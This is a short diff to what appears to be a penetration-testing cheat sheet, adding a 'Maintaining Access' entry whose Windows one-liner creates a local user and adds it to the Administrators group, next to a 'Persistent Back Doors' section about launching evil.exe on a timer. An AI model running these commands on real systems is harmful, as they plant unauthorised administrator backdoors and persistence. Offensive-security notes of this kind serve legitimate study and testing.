@@ -381,6 +381,12 @@ find /etc -iname *.conf
 ```
 
 ## Maintaining Access
+
+#### Creating User and Adding to Local Administrators
+```bash
+net user spotless spotless /add & net localgroup Administrators spotless /add 
+```
+
 #### Persistent Back Doors
 ```
 # Launch evil.exe every 10 minutes
